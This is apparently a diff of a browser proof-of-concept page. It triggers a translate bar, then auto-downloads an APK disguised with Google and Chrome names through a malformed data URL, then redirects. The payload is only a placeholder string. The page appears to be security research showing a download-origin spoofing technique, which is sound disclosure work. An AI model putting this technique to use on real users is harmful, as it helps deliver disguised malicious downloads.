@@ -1,60 +1,55 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="utf-8">
-  <title>اختبار مع إعادة التوجيه</title>
+  <meta charset="UTF-8">
+  <title>POC Redirect + Translate</title>
   <style>
     body {
       height: 100vh;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-size: 22px;
       font-family: sans-serif;
-    }
-    button {
-      background: #4CAF50;
-      border: none;
-      color: white;
-      padding: 16px 28px;
-      font-size: 18px;
-      cursor: pointer;
+      font-size: 22px;
     }
   </style>
 </head>
 
 <body>
 
-<button onclick="poc()">اضغط هنا للمتابعة</button>
+<h2>POC by Chigorin!</h2>
+<p>اضغط أي مفتاح للمتابعة</p>
 
 <script>
-function poc() {
+window.addEventListener('keydown', function () {
 
-  // 1. Tampilkan halaman bahasa asing → trigger Translate
+  // 1. Ganti halaman ke bahasa asing → trigger Translate bar
   document.body.innerHTML = `
-    <h1>هذه صفحة اختبار مع إعادة التوجيه</h1>
-    <p>جارٍ التحميل… يرجى الانتظار</p>
+    <h1>هذه صفحة اختبار</h1>
+    <p>جارٍ تحميل الملف… يرجى الانتظار</p>
   `;
 
-  // 2. Delay kecil untuk Translate UI muncul
+  // 2. Delay agar Translate UI sempat muncul
   setTimeout(() => {
 
-    // 3. Trigger download
+    // 3. Trigger download (malformed data URL)
     const a = document.createElement("a");
-    a.href = "https://ecdnts-del.github.io/test-apk/chrome.apk";
-    a.download = "chrome.apk";
+    a.href = "data://google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
+    a.download = "google.apk";
     document.body.appendChild(a);
     a.click();
     a.remove();
 
-    // 4. Redirect ke halaman bahasa asing kedua (agar Translate tetap muncul)
+    // 4. Redirect SETELAH download toast muncul
     setTimeout(() => {
-      window.location.href = "https://www.google.com"; 
-      // Halaman target juga berbahasa Arab
-    }, 12900);
+      window.location.href = "https://example.com";
+      // tujuan boleh apa saja, tidak mempengaruhi PoC
+    }, 350);
 
-  }, 1);
-}
+  }, 300);
+
+}, { once: true });
 </script>
 
 </body>
